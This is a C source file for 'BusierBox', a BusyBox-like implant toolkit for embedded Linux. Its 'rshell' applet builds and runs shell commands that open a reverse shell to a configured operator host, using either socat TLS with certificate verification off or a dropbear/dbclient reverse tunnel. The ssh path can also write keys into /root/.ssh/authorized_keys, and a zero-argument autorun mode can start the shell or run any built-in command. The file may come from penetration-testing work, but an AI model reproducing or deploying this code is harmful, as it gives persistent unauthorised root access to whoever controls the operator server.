#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "applets.h"

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#ifndef BB_RUNTIME_MODE
#define BB_RUNTIME_MODE "extract"
#endif
#ifndef BB_ENABLE_SURVEY
#define BB_ENABLE_SURVEY 1
#endif
#ifndef BB_ENABLE_DOCTOR
#define BB_ENABLE_DOCTOR 1
#endif
#ifndef BB_ENABLE_CONFIG_INFO
#define BB_ENABLE_CONFIG_INFO 1
#endif
#ifndef BB_ENABLE_EXTRACT
#define BB_ENABLE_EXTRACT 1
#endif
#ifndef BB_ENABLE_FETCH_FULL
#define BB_ENABLE_FETCH_FULL 1
#endif
#ifndef BUSIERBOX_ARTIFACT_TIER
#define BUSIERBOX_ARTIFACT_TIER "full"
#endif
#ifndef BB_ARTIFACT_KIND
#define BB_ARTIFACT_KIND BUSIERBOX_ARTIFACT_TIER
#endif
#ifndef BB_FULL_ZERO_ARG_MODE
#define BB_FULL_ZERO_ARG_MODE "help"
#endif
#ifndef BB_ZERO_ARG_MODE
#define BB_ZERO_ARG_MODE BB_FULL_ZERO_ARG_MODE
#endif
#ifndef BB_ZERO_ARG_LOG_MODE
#define BB_ZERO_ARG_LOG_MODE "quiet"
#endif
#ifndef BB_ZERO_ARG_CUSTOM_COMMAND
#define BB_ZERO_ARG_CUSTOM_COMMAND ""
#endif
#ifndef BB_RSHELL_MODE
#define BB_RSHELL_MODE "ssh"
#endif
#ifndef BB_RSHELL_TRANSPORT
#define BB_RSHELL_TRANSPORT BB_RSHELL_MODE
#endif
#ifndef BB_RSHELL_AUTHKEYS_MODE
#define BB_RSHELL_AUTHKEYS_MODE "disabled"
#endif
#ifndef BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING
#define BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING "no"
#endif
#ifndef BB_RSHELL_SOCAT_PORT
#define BB_RSHELL_SOCAT_PORT "22203"
#endif
#ifndef BB_BUILTIN_TLS_ENABLE
#define BB_BUILTIN_TLS_ENABLE "no"
#endif
#ifndef BB_AUTORUN_GUARD_ENABLE
#define BB_AUTORUN_GUARD_ENABLE "yes"
#endif
#ifndef BB_AUTORUN_GUARD_PATH
#define BB_AUTORUN_GUARD_PATH "/tmp/busierbox-autorun"
#endif
#ifndef BB_AUTORUN_REENTRY_ACTION
#define BB_AUTORUN_REENTRY_ACTION "status"
#endif
#ifndef BB_AUTORUN_STALE_LOCK_POLICY
#define BB_AUTORUN_STALE_LOCK_POLICY "recover"
#endif
#ifndef BB_OPERATOR_SERVER_HOST
#define BB_OPERATOR_SERVER_HOST ""
#endif
#ifndef BB_OPERATOR_SERVER_USER
#define BB_OPERATOR_SERVER_USER "operator"
#endif
#ifndef BB_OPERATOR_SERVER_SSH_PORT
#define BB_OPERATOR_SERVER_SSH_PORT "22"
#endif
#ifndef BB_OPERATOR_REMOTE_FORWARD_PORT
#define BB_OPERATOR_REMOTE_FORWARD_PORT "2200"
#endif
#ifndef BB_OPERATOR_TARGET_DROPBEAR_PORT
#define BB_OPERATOR_TARGET_DROPBEAR_PORT "2222"
#endif
#ifndef BB_OPERATOR_TARGET_BIND_HOST
#define BB_OPERATOR_TARGET_BIND_HOST "127.0.0.1"
#endif
#ifndef BB_OPERATOR_KNOWN_HOSTS_POLICY
#define BB_OPERATOR_KNOWN_HOSTS_POLICY "off"
#endif

const struct bb_applet bb_applets[] = {
    {"list", applet_list_main, "list native applets and payload tools"},
#if BB_ENABLE_SURVEY
    {"survey", applet_survey_main, "print embedded Linux triage information"},
#endif
    {"envfix", applet_envfix_main, "print or apply environment repair commands"},
#if BB_ENABLE_EXTRACT
    {"extract", applet_extract_main, "extract or reuse the payload runtime"},
#endif
    {"clean", applet_clean_main, "remove local extracted payload runtime"},
#if BB_ENABLE_CONFIG_INFO
    {"config-info", applet_config_info_main, "print build and payload information"},
#endif
#if BB_ENABLE_DOCTOR
    {"doctor", applet_doctor_main, "inspect embedded and extracted payload health"},
#endif
#if BB_ENABLE_FETCH_FULL
    {"fetch-full", applet_fetch_full_main, "download a full BusierBox artifact"},
#endif
    {"rshell", applet_rshell_main, "start configured reverse shell transport"},
};

const unsigned int bb_applet_count = sizeof(bb_applets) / sizeof(bb_applets[0]);

static const char *base_name(const char *path)
{
    const char *slash = strrchr(path, '/');
    return slash ? slash + 1 : path;
}

static void usage(FILE *out)
{
    bb_print_applet_list(out);
}

static int yes_value(const char *s)
{
    return s && (!strcmp(s, "yes") || !strcmp(s, "1") || !strcmp(s, "true") || !strcmp(s, "on"));
}

int bb_dispatch(const char *name, int argc, char **argv)
{
    unsigned int i;

    for (i = 0; i < bb_applet_count; i++) {
        if (strcmp(name, bb_applets[i].name) == 0)
            return bb_applets[i].main(argc, argv);
    }

    return -1;
}

static int mkdir_p(const char *path)
{
    char tmp[PATH_MAX];
    char *p;
    if (!path || !*path)
        return -1;
    snprintf(tmp, sizeof(tmp), "%s", path);
    for (p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            if (mkdir(tmp, 0700) != 0 && errno != EEXIST)
                return -1;
            *p = '/';
        }
    }
    if (mkdir(tmp, 0700) != 0 && errno != EEXIST)
        return -1;
    return 0;
}

static int read_lock_pid(const char *lock_path, long *pid, char *mode, size_t modesz)
{
    FILE *fp = fopen(lock_path, "r");
    char key[64], val[128];
    *pid = -1;
    if (mode && modesz)
        mode[0] = '\0';
    if (!fp)
        return -1;
    while (fscanf(fp, "%63[^=]=%127s\n", key, val) == 2) {
        if (!strcmp(key, "pid"))
            *pid = strtol(val, NULL, 10);
        else if (!strcmp(key, "mode") && mode && modesz)
            snprintf(mode, modesz, "%s", val);
    }
    fclose(fp);
    return 0;
}

static const char *autorun_guard_path(void)
{
    const char *env = getenv("BUSIERBOX_AUTORUN_GUARD_PATH");
    return env && *env ? env : BB_AUTORUN_GUARD_PATH;
}

static void print_autorun_status(FILE *out)
{
    char lock_path[PATH_MAX], mode[128] = "";
    const char *guard_path = autorun_guard_path();
    long pid = -1;
    snprintf(lock_path, sizeof(lock_path), "%s/autorun.lock", guard_path);
    read_lock_pid(lock_path, &pid, mode, sizeof(mode));
    fprintf(out, "BusierBox autorun already active.\n");
    fprintf(out, "  mode: %s\n", mode[0] ? mode : "unknown");
    fprintf(out, "  pid: %ld\n", pid);
    fprintf(out, "  guard: %s\n\n", guard_path);
    fprintf(out, "Explicit commands still work:\n");
    fprintf(out, "  busierbox doctor\n");
    fprintf(out, "  busierbox --help\n");
}

static int reentry_action(void)
{
    char *doctor_argv[] = { "doctor", NULL };
    if (!strcmp(BB_AUTORUN_REENTRY_ACTION, "doctor"))
        return applet_doctor_main(1, doctor_argv);
    if (!strcmp(BB_AUTORUN_REENTRY_ACTION, "help") || !strcmp(BB_AUTORUN_REENTRY_ACTION, "menu")) {
        usage(stdout);
        return 0;
    }
    print_autorun_status(stdout);
    return 0;
}

static int guard_needed(const char *mode)
{
    return !strcmp(mode, "rshell") || !strcmp(mode, "custom") || !strcmp(mode, "shell");
}

static int acquire_autorun_guard(const char *mode)
{
    char lock_path[PATH_MAX], status_path[PATH_MAX], old_mode[128] = "";
    const char *guard_path = autorun_guard_path();
    long old_pid = -1;
    int fd;
    time_t now;
    if (!yes_value(BB_AUTORUN_GUARD_ENABLE) || !guard_needed(mode) ||
        (!strcmp(BB_AUTORUN_REENTRY_ACTION, "bootstrap-again") ||
         !strcmp(BB_AUTORUN_REENTRY_ACTION, "shell-again")))
        return 1;
    if (mkdir_p(guard_path) != 0) {
        fprintf(stderr, "autorun: unable to create guard path %s: %s\n", guard_path, strerror(errno));
        return 0;
    }
    snprintf(lock_path, sizeof(lock_path), "%s/autorun.lock", guard_path);
retry:
    fd = open(lock_path, O_CREAT | O_EXCL | O_WRONLY, 0600);
    if (fd < 0) {
        if (errno == EEXIST) {
            if (read_lock_pid(lock_path, &old_pid, old_mode, sizeof(old_mode)) == 0 &&
                old_pid > 0 && kill((pid_t)old_pid, 0) != 0 && errno == ESRCH &&
                !strcmp(BB_AUTORUN_STALE_LOCK_POLICY, "recover")) {
                unlink(lock_path);
                goto retry;
            }
            reentry_action();
            return 0;
        }
        fprintf(stderr, "autorun: unable to create lock %s: %s\n", lock_path, strerror(errno));
        return 0;
    }
    now = time(NULL);
    dprintf(fd, "mode=%s\npid=%ld\nstarted_at=%ld\nartifact_tier=%s\n", mode, (long)getpid(), (long)now, BUSIERBOX_ARTIFACT_TIER);
    close(fd);
    snprintf(status_path, sizeof(status_path), "%s/status", guard_path);
    fd = open(status_path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
    if (fd >= 0) {
        dprintf(fd, "mode=%s\npid=%ld\nstarted_at=%ld\nartifact_tier=%s\n", mode, (long)getpid(), (long)now, BUSIERBOX_ARTIFACT_TIER);
        close(fd);
    }
    return 1;
}

static void shquote_append(char *dst, size_t dstsz, const char *src)
{
    size_t used = strlen(dst);
    const char *p;
    if (used + 2 >= dstsz)
        return;
    dst[used++] = '\'';
    dst[used] = '\0';
    for (p = src ? src : ""; *p; p++) {
        if (*p == '\'') {
            if (used + 4 >= dstsz)
                break;
            memcpy(dst + used, "'\\''", 4);
            used += 4;
        } else {
            if (used + 1 >= dstsz)
                break;
            dst[used++] = *p;
        }
        dst[used] = '\0';
    }
    if (used + 1 < dstsz) {
        dst[used++] = '\'';
        dst[used] = '\0';
    }
}

static int path_exec(const char *path)
{
    return path && *path && access(path, X_OK) == 0;
}

int applet_rshell_main(int argc, char **argv)
{
    char payload[PATH_MAX], dropbear[PATH_MAX], dbclient[PATH_MAX], dropbearkey[PATH_MAX], socat[PATH_MAX];
    char hostkey[PATH_MAX], identity[PATH_MAX], authkeys[PATH_MAX], rootssh[PATH_MAX];
    char cmd[8192] = "";
    const char *subcmd = "start";
    const char *transport = BB_RSHELL_TRANSPORT;
    int i;
    int rc;

    if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
        puts("usage: busierbox rshell [start|status|stop|restart] [--transport ssh|socat-tls|builtin-tls]");
        puts("Starts or manages the configured reverse access transport.");
#ifdef HAVE_WOLFSSL
        puts("Implemented transports: ssh (Dropbear/dbclient), socat-tls (payload socat), builtin-tls (wolfSSL core).");
#else
        puts("Implemented transports: ssh (Dropbear/dbclient), socat-tls (payload socat).");
        puts("builtin-tls is available when rebuilt with BB_BUILTIN_TLS_ENABLE=yes and wolfSSL installed.");
#endif
        return 0;
    }
    if (argc > 1 && argv[1][0] != '-')
        subcmd = argv[1];
    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--transport") && i + 1 < argc) {
            transport = argv[++i];
        } else if (!strncmp(argv[i], "--transport=", 12)) {
            transport = argv[i] + 12;
        }
    }

    if (!strcmp(subcmd, "status")) {
        const char *guard = autorun_guard_path();
        char status_path[PATH_MAX], lock_path[PATH_MAX];
        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
        if (access(status_path, R_OK) == 0) {
            char buf[512];
            FILE *fp = fopen(status_path, "r");
            while (fp && fgets(buf, sizeof(buf), fp))
                fputs(buf, stdout);
            if (fp)
                fclose(fp);
            return 0;
        }
        if (access(lock_path, R_OK) == 0) {
            puts("rshell_status=possibly-active");
            printf("rshell_guard=%s\n", guard);
            return 0;
        }
        puts("rshell_status=inactive");
        printf("rshell_guard=%s\n", guard);
        return 0;
    }
    if (!strcmp(subcmd, "stop")) {
        const char *guard = autorun_guard_path();
        char lock_path[PATH_MAX], status_path[PATH_MAX];
        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
        unlink(lock_path);
        unlink(status_path);
        puts("rshell_stopped=best-effort");
        return 0;
    }
    if (!strcmp(subcmd, "restart")) {
        const char *guard = autorun_guard_path();
        char lock_path[PATH_MAX], status_path[PATH_MAX];
        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
        unlink(lock_path);
        unlink(status_path);
        subcmd = "start";
    }
    if (strcmp(subcmd, "start")) {
        fprintf(stderr, "rshell: unknown subcommand '%s'\n", subcmd);
        return 2;
    }

    if (!strcmp(transport, "builtin-tls")) {
#ifdef HAVE_WOLFSSL
        return rshell_builtin_tls(BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
#else
        fputs("rshell: builtin-tls requires wolfSSL; rebuild with BB_BUILTIN_TLS_ENABLE=yes\n", stderr);
        return 2;
#endif
    }
    if (strcmp(transport, "ssh") && strcmp(transport, "socat-tls")) {
        fprintf(stderr, "rshell: unsupported transport '%s'\n", transport);
        return 2;
    }
    if (!strcmp(BB_RUNTIME_MODE, "core-only")) {
        fprintf(stderr, "rshell: transport '%s' requires staged payload tools but this artifact uses core-only runtime mode\n", transport);
        fputs("rshell: change Runtime mode to 'extract' or 'no-residue' in menuconfig, then rebuild\n", stderr);
#ifndef HAVE_WOLFSSL
        fputs("rshell: for a no-extraction shell, rebuild with BB_BUILTIN_TLS_ENABLE=yes (requires wolfSSL) and transport=builtin-tls\n", stderr);
#endif
        return 127;
    }
    if (!BB_OPERATOR_SERVER_HOST[0]) {
        fputs("rshell: operator host is not configured; set it in menuconfig under Payload Options -> Applet configuration -> Reverse shell\n", stderr);
        return 2;
    }
    if (bb_ensure_payload_dir(payload, sizeof(payload)) != 0) {
        fputs("rshell: payload unavailable; cannot start reverse shell transport\n", stderr);
        return 127;
    }
    snprintf(dropbear, sizeof(dropbear), "%s/bin/dropbear", payload);
    snprintf(dbclient, sizeof(dbclient), "%s/bin/dbclient", payload);
    snprintf(dropbearkey, sizeof(dropbearkey), "%s/bin/dropbearkey", payload);
    snprintf(socat, sizeof(socat), "%s/bin/socat", payload);
    snprintf(hostkey, sizeof(hostkey), "%s/etc/dropbear/dropbear_rsa_host_key", payload);
    snprintf(identity, sizeof(identity), "%s/home/.ssh/id_dbclient", payload);
    snprintf(authkeys, sizeof(authkeys), "%s/home/.ssh/authorized_keys", payload);
    snprintf(rootssh, sizeof(rootssh), "%s", "/root/.ssh");

    if (!strcmp(transport, "socat-tls")) {
        if (!path_exec(socat)) {
            fputs("rshell: socat-tls transport requires staged socat; enable socat in Heavy tools and rebuild\n", stderr);
            return 127;
        }
        strcat(cmd, "exec ");
        shquote_append(cmd, sizeof(cmd), socat);
        strcat(cmd, " OPENSSL:");
        shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_HOST ":" BB_RSHELL_SOCAT_PORT ",verify=0");
        strcat(cmd, " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane");
        rc = system(cmd);
        if (rc == -1)
            return 1;
        if (WIFEXITED(rc))
            return WEXITSTATUS(rc);
        return 1;
    }

    if (!path_exec(dropbear) || !path_exec(dbclient)) {
        fputs("rshell: dropbear/dbclient are not staged; enable dropbear in Heavy tools and rebuild\n", stderr);
        return 127;
    }
    if (access(identity, R_OK) != 0) {
        fprintf(stderr, "rshell: dbclient identity not staged at %s; prepare reverse shell defaults in menuconfig and rebuild\n", identity);
        return 127;
    }

    strcat(cmd, "set -eu; ");
    /* Kill any leftover payload dropbear/dbclient from previous sessions so the
     * new one can bind the configured port cleanly. */
    strcat(cmd, "pkill -f ");
    shquote_append(cmd, sizeof(cmd), dropbear);
    strcat(cmd, " 2>/dev/null || true; ");
    strcat(cmd, "pkill -f ");
    shquote_append(cmd, sizeof(cmd), dbclient);
    strcat(cmd, " 2>/dev/null || true; ");
    strcat(cmd, "sleep 1; ");
    strcat(cmd, "mkdir -p ");
    shquote_append(cmd, sizeof(cmd), rootssh);
    strcat(cmd, " ");
    strcat(cmd, "$(dirname ");
    shquote_append(cmd, sizeof(cmd), hostkey);
    strcat(cmd, "); ");
    if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-copy")) {
        strcat(cmd, "if [ -f ");
        shquote_append(cmd, sizeof(cmd), authkeys);
        strcat(cmd, " ] && [ ! -f /root/.ssh/authorized_keys ]; then cp ");
        shquote_append(cmd, sizeof(cmd), authkeys);
        strcat(cmd, " /root/.ssh/authorized_keys 2>/dev/null || true; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
    } else if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-merge")) {
        strcat(cmd, "if [ -f ");
        shquote_append(cmd, sizeof(cmd), authkeys);
        strcat(cmd, " ]; then tmp=/root/.ssh/authorized_keys.busierbox.$$; { sed '/^# BEGIN BUSIERBOX RSHELL$/,/^# END BUSIERBOX RSHELL$/d' /root/.ssh/authorized_keys 2>/dev/null || true; echo '# BEGIN BUSIERBOX RSHELL'; cat ");
        shquote_append(cmd, sizeof(cmd), authkeys);
        strcat(cmd, "; echo '# END BUSIERBOX RSHELL'; } >$tmp && mv $tmp /root/.ssh/authorized_keys 2>/dev/null || rm -f $tmp; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
    }
    if (!strcmp(BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING, "yes")) {
        strcat(cmd, "if [ ! -f ");
        shquote_append(cmd, sizeof(cmd), hostkey);
        strcat(cmd, " ] && [ -x ");
        shquote_append(cmd, sizeof(cmd), dropbearkey);
        strcat(cmd, " ]; then ");
        shquote_append(cmd, sizeof(cmd), dropbearkey);
        strcat(cmd, " -t rsa -f ");
        shquote_append(cmd, sizeof(cmd), hostkey);
        strcat(cmd, " >/dev/null 2>&1 || true; fi; ");
    }
    strcat(cmd, "if [ ! -f ");
    shquote_append(cmd, sizeof(cmd), hostkey);
    strcat(cmd, " ]; then echo 'rshell: missing Dropbear host key; enable pre-generated host key or allow runtime host-key generation' >&2; exit 2; fi; ");
    shquote_append(cmd, sizeof(cmd), dropbear);
    strcat(cmd, " -r ");
    shquote_append(cmd, sizeof(cmd), hostkey);
    strcat(cmd, " -p ");
    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
    strcat(cmd, " -F -E >/tmp/busierbox-dropbear.log 2>&1 & dbpid=$!; ");
    shquote_append(cmd, sizeof(cmd), dbclient);
    strcat(cmd, " -i ");
    shquote_append(cmd, sizeof(cmd), identity);
    if (!strcmp(BB_OPERATOR_KNOWN_HOSTS_POLICY, "off"))
        strcat(cmd, " -y");
    strcat(cmd, " -K 30 -N -R ");
    shquote_append(cmd, sizeof(cmd), "127.0.0.1:" BB_OPERATOR_REMOTE_FORWARD_PORT ":" BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
    strcat(cmd, " -p ");
    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_SSH_PORT);
    strcat(cmd, " ");
    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_USER "@" BB_OPERATOR_SERVER_HOST);
    strcat(cmd, " >/tmp/busierbox-dbclient.log 2>&1 & dcpid=$!; ");
    strcat(cmd, "echo rshell_started=yes; echo dropbear_pid=$dbpid; echo dbclient_pid=$dcpid; ");
    strcat(cmd, "echo connect_hint='ssh -p " BB_OPERATOR_REMOTE_FORWARD_PORT " root@127.0.0.1'");

    /* Use popen so we can capture the dbclient PID and write it to the autorun
     * guard lock.  dbclient stays alive exactly as long as the tunnel is open,
     * so a live dbclient PID means a second rshell should be blocked. */
    {
        FILE *fp;
        char line[256];
        long dbclient_pid = -1;
        int exit_status = 0;

        fp = popen(cmd, "r");
        if (!fp)
            return 1;
        while (fgets(line, sizeof(line), fp)) {
            fputs(line, stdout);
            fflush(stdout);
            if (strncmp(line, "dbclient_pid=", 13) == 0)
                dbclient_pid = strtol(line + 13, NULL, 10);
        }
        rc = pclose(fp);
        if (rc != -1 && WIFEXITED(rc))
            exit_status = WEXITSTATUS(rc);

        /* Write the autorun guard lock with dbclient's PID.  dbclient is alive
         * exactly as long as the reverse tunnel is open, so zero-arg reentry
         * while the tunnel is up will hit a live PID and be blocked. */
        if (dbclient_pid > 0 && yes_value(BB_AUTORUN_GUARD_ENABLE)) {
            char lock_path[PATH_MAX];
            int lfd;
            const char *gp = autorun_guard_path();
            mkdir_p(gp);
            snprintf(lock_path, sizeof(lock_path), "%s/autorun.lock", gp);
            lfd = open(lock_path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
            if (lfd >= 0) {
                dprintf(lfd, "mode=rshell\npid=%ld\nstarted_at=%ld\nartifact_tier=%s\n",
                        dbclient_pid, (long)time(NULL), BUSIERBOX_ARTIFACT_TIER);
                close(lfd);
            }
        }
        return exit_status;
    }
}

static int run_custom_zero_arg(void)
{
    int rc;
    if (!BB_ZERO_ARG_CUSTOM_COMMAND[0]) {
        fputs("zero-arg custom mode selected but BB_ZERO_ARG_CUSTOM_COMMAND is empty\n", stderr);
        return 2;
    }
    rc = system(BB_ZERO_ARG_CUSTOM_COMMAND);
    if (rc == -1)
        return 1;
    if (WIFEXITED(rc))
        return WEXITSTATUS(rc);
    return 1;
}

static int run_zero_arg_mode(const char *mode)
{
    char *rshell_argv[] = { "rshell", NULL };
    char *survey_argv[] = { "survey", NULL };

    if (!mode || !*mode || !strcmp(mode, "help") || !strcmp(mode, "menu") ||
        !strcmp(mode, "doctor")) {
        usage(!mode || !*mode || !strcmp(mode, "help") ? stderr : stdout);
        return !mode || !*mode || !strcmp(mode, "help") ? 2 : 0;
    }
    if (!strcmp(mode, "survey"))
        return applet_survey_main(1, survey_argv);
    if (!strcmp(mode, "rshell"))
        return applet_rshell_main(1, rshell_argv);
    if (!strcmp(mode, "custom"))
        return run_custom_zero_arg();
    fprintf(stderr, "unknown zero-arg mode: %s\n", mode);
    usage(stderr);
    return 2;
}

static int zero_arg_main(void)
{
    const char *mode = getenv("BUSIERBOX_ZERO_ARG_MODE");
    if (!mode || !*mode) {
        mode = BB_ZERO_ARG_MODE;
    }
    if (getenv("BUSIERBOX_NO_AUTORUN") && !strcmp(getenv("BUSIERBOX_NO_AUTORUN"), "1")) {
        usage(stdout);
        return 0;
    }
    if (!acquire_autorun_guard(mode))
        return 0;
    return run_zero_arg_mode(mode);
}

int main(int argc, char **argv)
{
    const char *invoked;
    int rc;

    if (argc < 1 || !argv || !argv[0]) {
        usage(stderr);
        return 2;
    }
    bb_set_argv0(argv[0]);

    invoked = base_name(argv[0]);
    if (strcmp(invoked, "busierbox") != 0 && strncmp(invoked, "busierbox-", 10) != 0) {
        rc = bb_dispatch(invoked, argc, argv);
        if (rc >= 0)
            return rc;
        return bb_exec_payload_applet(invoked, argc, argv);
    }

    if (argc < 2)
        return zero_arg_main();

    if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
        usage(argc < 2 ? stderr : stdout);
        return 0;
    }

    rc = bb_dispatch(argv[1], argc - 1, argv + 1);
    if (rc >= 0)
        return rc;

    return bb_exec_payload_applet(argv[1], argc - 1, argv + 1);
}
